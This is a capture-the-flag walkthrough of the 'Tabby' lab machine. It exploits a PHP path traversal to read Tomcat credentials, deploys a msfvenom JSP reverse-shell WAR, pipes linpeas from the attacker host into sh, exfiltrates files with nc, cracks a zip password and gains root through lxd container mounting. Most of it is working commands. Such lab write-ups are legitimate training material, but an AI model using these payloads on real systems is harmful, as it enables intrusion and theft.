# tabby

Tabby ran on `10.10.10.194`. My IP was `10.10.14.69`

<details>
<summary>used techniques</summary>

* php directory traversal
* tomcat manager war shell upload curl
* payload generation with msfvenom
* zip archive password cracking
* exfiltration with nc
* lxc/ldx privilegde escalation

</details>

---

```sh
## kali

sudo su -
cd projects
mkdir tabby
cd tabby
mkdir share
mkdir foothold
mkdir exfil
mkdir privesc

nv /etc/local # add: 10.10.10.194 tabby

sup tabby # nmap scans.

so tabby # scan summary and setting vars.

# 22 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
ssh tabby # denied, publickey

# 80 Apache httpd 2.4.41 ((Ubuntu))
  # browser ->
    # nothing on the quick

# 8080 Apache Tomcat
  # browser -> open all links
    # /docs -> Apache Tomcat 9 (Version 9.0.31, Feb 24 2020)
    # /examples -> are installed
    # /manager & /host-manager -> ask for password (401 gives info)
    # users are defined in /etc/tomcat9/tomcat-users.xml

dirb http://tabby/ -o dirb80.log
dirb http://tabby:8080/ -o dirb8080.log

tail -F *.log | grep --line-buffered ^==
```

```sh
## vmhost

# local port forwarding so we can browse the sites from outside kali:
ssh -N kali -L 0.0.0.0:80:tabby:80
ssh -N kali -L 0.0.0.0:8080:tabby:8080

# port 80
# wappalyzer: apache 2.4.41, ubuntu

# port 8080
# wappalyzer: apache 2.4.41, ubuntu

# no new info :/
```

```sh
## kali

# port 22
searchsploit openssh 8 # nothing useful.
# https://www.cybersecurity-help.cz/vdb/SB2020052708

# port 80
searchsploit apache 2 # no public exploit for 2.4.41.

# port 8080
searchsploit tomcat
# https://tomcat.apache.org/security-9.html
# nothing useful.
```

---

I mean the box is called `tabby` so it's probably a Tomcat exploit.

```sh
grep ^== dirb* # nothing interesting.
```
* port 8080 via browser, still nothing
* port 80 via browser:
* some links point to megahosting.htb
* try them with the server.
  * `news.php` with `file` parameter!
* let's try passing some files:
  * first the one from the page:
    * `/news.php?file=statement`
      * nice apology
    * `/news.php?file=index.html`
      * empty page
* let's switch to curl

```sh
## kali
curl -s tabby > index80.html
grep .htb index80.html # a mail address and the aforementioned news.php

curl tabby/news.php?file=statement # yep, it's still the statement.
curl tabby/news.php?file=index.html # empty.
curl tabby/news.php?file=index.php # empty.
curl tabby/news.php?file=../index.html # empty.
curl tabby/news.php?file=../index.php # jackpot! it's the root index file.
curl tabby/news.php?file=../../index.php # empty.

# let's try breaking out and fetching a file that was mentioned on tabby:8080
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/ROOT/index.html # it works!

# when we entered a wrong password, tabby:8080/manager/html mentioned conf/tomcat-users.xml
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/conf/tomcate-users.xml # empty :(

# whoops, one an errant e
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/conf/tomcat-users.xml # nope.
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/conf/tomcat-users.xml # nope.
curl tabby/news.php?file=../../../../../../../var/lib/tomcat9/webapps/ROOT/conf/tomcat-users.xml # nope.

# let's google the location for tomcat-users.xml

# $CATALINA_BASE/conf/tomcat-users.xml
# $CATALINA_BASE is /var/lib/tomcat9
# should work, but does not.

# remove ../ until we find the last that works. 4 are enough to get to the root dir.
# try something else:
cd exfil
curl tabby/news.php?file=../../../../usr/share/doc/tomcat9-common/RUNNING.txt.gz --output RUNNING.txt.gz
gunzip *.gz

# read it.
# try another path:
curl tabby/news.php?file=../../../../etc/hosts # works.

# let's look for the ubuntu tomcat package:
# https://packages.ubuntu.com/search?keywords=tomcat9
# I don't know the exact Ubuntu version, I'm assuming they are all similar:
# https://packages.ubuntu.com/focal/all/tomcat9/filelist
curl tabby/news.php?file=../../../../../etc/cron.daily/tomcat9 # works. good start.
curl tabby/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml # YES!

# let's download it:
curl tabby/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml -o tomcat-users.xml
grep password *.xml

# let's try those credentials:
# tabby:8080/manager/html # nope
  # can we find those creds too?
# tabby:8080/manager/host-manager # yes!
  # now we have access to the Tomcat Virtual Host Manager
```

Wait a minute!

```sh
## kali
# totally forgot, there's ssh running!
curl tabby/news.php?file=../../../../../etc/ssh/sshd_config > sshd_config
curl tabby/news.php?file=../../../../../etc/ssh/ssh_config > ssh_config
# private keys can't be fetched, oh well.
```

Maybe the webserver on port 80

```sh
curl tabby/news.php?file=../../../../var/www/html/index.php
# maybe we can get news.php
curl tabby/news.php?file=../../../../var/www/html/news.php > news.php # yes!
curl tabby/news.php?file=../../../../var/www/html/index.php > index.php # might as well.
curl tabby/news.php?file=../../../../lib/systemd/system/tomcat9.service > tomcat9.service # should give us the paths.

curl http://tabby/news.php?file=../../../../etc/passwd > passwd # at least we will get the usernames.
egrep -v "bin/nologin|bin/false" passwd
# we found a new user: ash
# can't manage to extract any info though.
```
---

Alright, after a couple of hours I've looked up a hint:
The idea is to upload a shell via the Tomcat manager.
(I did not know you could upload things, so I would have
not figured that out anytime soon.)

* http://tabby:8080/host-manager/html
  * click server status
  * click complete server status
    * (http://tabby:8080/manager/status/all)
    * take a look at the applications
      * let's add our own
      * as soon as we call it our payload will be executed
      * let's create a TCP reverse shell

* Tomcat uses Java JSPs. (JavaServerPages).
* WAR files: Web Applications aRchives (contains a JAR)
* JAR files: Java ARchives

The URL for uploading WAR files is http://tabby:8080/manager/text/deploy

```sh
msfvenom --list payloads > msf_payloads # long list.
grep java msf_payloads # java/jsp_shell_reverse_tcp looks good.
msfvenom -l formats # war is what we need (wait what).

# let's open a listener:
nc -vnlp 42424 # this will be our shell.
# no rlwrap, we'll use another method in a bit.

# create the payload:
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.69 LPORT=42424 -f war -o shell.war

# war files are packed folders in disguise:
mkdir shell && cd shell
jar -xvf ../shell.war
# take a look at it. the jsp file is interesting
# (around line 50)
cd ..

# you can upload files with curl. same credentials we found before.
curl -u 'tomcat':'$3cureP4s5w0rd123!' -T shell.war 'http://tabby:8080/manager/text/deploy?path=/shell'
# -u user credentials
# -T upload file

# our new webapp should be visible in the manager now!

# visit the new app in the browser:
# http://tabby:8080/shell
# or curl it, don't forget the following /:
curl 'http://tabby:8080/shell/'

```

```sh
# in the shell:
# this shell does not provide any feedback. let's upgrade it:
python3 -c 'import pty;pty.spawn("/bin/bash")'
# ctr-z send to background
stty raw -echo # setup terminal
fg # back to shell.
export TERM=screen-256color # or xterm
# now we have a good shell. (not perfect though -> less)
# curcially, we can use ctrl-c without breaking out of the shell completely!
screen # does not work, insufficient write permissions. different dir maybe?

id # tomcat, tomcat, tomcat.
umask -S # permissions for new files.
uname -a # Linux tabby 5.4.0-31-generic #35-Ubuntu SMP Thu May 7 20:20:34 UTC 2020 x86_64 [...]
env
pwd # /var/lib/tomcat9/webapps
ls -alp # finally we can properly browse around!
ls -pal webapps
alias ll='ls -lAp' # always useful.
find . # decent alternative for: tree

# we have gained a new ability:
# let's exfiltrate some data that we have generated ourselves:
cd webapps/shell
find / > filesystem 2>&1 # get filesystem layout.

# look for ports.
netstat -nao

# we should try to switch to a user with more rights.
# we know about ash:
su ash # maybe: $3cureP4s5w0rd123!
# that did not work.

# maybe we can run lipeas...
```

```sh
# kali:
curl tabby:8080/shell/filesystem > filesystem
grep "^/home" filesystem # let's look for user directories.
# we found ash again.

python3 -m http.server 80 --directory /opt
```

```sh
# in the reverse shell:
wget 10.10.14.69/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a | tee linpeas.log

# alternatively, don't save it:
curl 10.10.14.69/linpeash.sh | sh
```

```sh
# kali:
# get the log to read it in peas:
cd /root/projects/tabby/exfil
curl tabby:8080/shell/linpeas.log
less -R linpeas.log # read it in full.
  # linpeas gives us the creds for tomcat, that we already found (and used.)
# there's a zip file in the same folder as the statement that was included by news.php: a backup.
# in the future I should check out adjacent files.
wget tabby/news.php?file=../../../../var/www/html/files/16162020_backup.zip -O 16162020_backup.zip
unzip *.zip # it's encrypted :(

# setup rockyou
cd /usr/share/wordlists
gunzip rockyou.txt.gz # will replace the gz with unpacked txt!

cd /root/projects/tabby/exfil

zip2john 16162020_backup.zip -o var/www/html/Readme.txt > 16162020_backup.hash

# try to crack it with john:
john --wordlist=/usr/share/wordlists/rockyou.txt 16162020_backup.hash
john --show *.hash
# if you lose the hash you can still look
# at the cracked password: ~/.john/john.pot

unzip *.zip # password: admin@it

# it's just a backup, nothing really interesting.
```

```sh
# try our new password:

su ash # maybe: admin@it
# that one worked!

screen # still does not work.
tmux # this one does and I prefer it, lucky.

# our terminal defaults to 80x24, let's fix that.
# exit our shell.
# in kali:
stty -a | egrep 'row|col' # note down rows and columns.
# get shell.
# spawn bash.
# disable echo, enable raw.
stty columns 141 rows 21 # values from before.
# set TERM.
# switch to ash.
tmux
# ctrl-b ctrl-b: send prefix to inner tmux. (if you use it in kali too)
# press: ctrl-b ctrl-b "
# tmux should span the entire width and height.
# tmux works, we have tab completion, control works, vim works!

sudo -l # no sudo for us.
id
umask -s
pushd `pwd`
cd /var/www/html
ll # see alias above.
# ./files belongs to us
cd files
touch test # but it's a read only file-system.

popd # back to /var/lib/tomcat9
```

```sh
# on kali:
# exfiltrate:
cd /root/projects/tabby/exfil
mkdir ash_user && cd ash_user

nc -lnvp 12345 > linpeas_ash.log # blocking.
tail -n+1 -F linpeas_ash.log # blocking.
```

```sh
# on tabby/ash:
curl 10.10.14.69/linpeas.sh | sh | nc 10.10.14.69 12345
```

Exfiltrate the user flag:

```sh
# on kali:
nc -lnvp 12345 > user.txt

# on tabby/ash:
# /home/ash/user.txt | nc -q0 10.10.14.69 12345
# or:
# nc -q0 10.10.14.69 12345 < /home/ash/user.txt
```

Let's take a closer look at `linpeas_ash.log`

we find the following:
  * ash is part of the `lxd` group
    * we saw that with `id` already
    * let's do some research
      * `LXC` are LinuX Containers, a virtualization technology with a shared Kernel
      * `LXD` is the LinuX Daemon, a lightweight container hypervisor, built on top of LXC
        * it's the management API for LXC
        * Docker uses it
      * any user that is part of the `lxd` group can use it to gain root write access
        * https://shenaniganslabs.io/2019/05/21/LXD-LPE.html

```sh
egrep -i --color=always 'lxc|lxd' filesystem | less -R
# = or ^g shows progress in file!
# if you jump to the bottom with G first you will get a percentage from then on out.

# let's get a small container image.
# I like alpine for Docker, so let's use it again:
cd /opt
git clone 'https://github.com/saghul/lxd-alpine-builder.git'
cd lxd-alpine-builder
./build-alpine

cd /root/projects/tabby/privesc
cp /opt/lxd-alpine-builder/*.gz . # alpine-v3.12-x86_64-20201021_1440.tar.gz
mv *.gz alpine.tar.gz
```

```sh
# from tabby/ash:
find / -iname '*alpine*' | less -R # you can save the output with: s
# nothing, let's use our own version then:

wget 10.10.14.69/alpine.tar.gz
lxc ls # see if there are any running. no.
lxc image import alpine.tar.gz --alias alpine
lxc image list
lxc init alpine ben -c security.privileged=true
# error: No storage pool found. Please create a new storage pool

# let's do that:
lxd init
# choose all default options, except:
  # dir as storage backend (easiest to setup)

lxc init alpine ben -c security.privileged=true # now it works.
lxc config device add ben ben disk source=/ path=/mnt recursive=true # mount host root.
lxc ls # find ben.

lxc start ben
lxc ls # we have an ip
lxc exec ben /bin/sh # get our root shell.

whoami # root!
find / -iname 'root.txt' 2>/dev/null # /mnt/root/root.txt
cat /mnt/root/root.txt # a81e399d36acc11885b57f6d745c36a0
```

Tabby done!
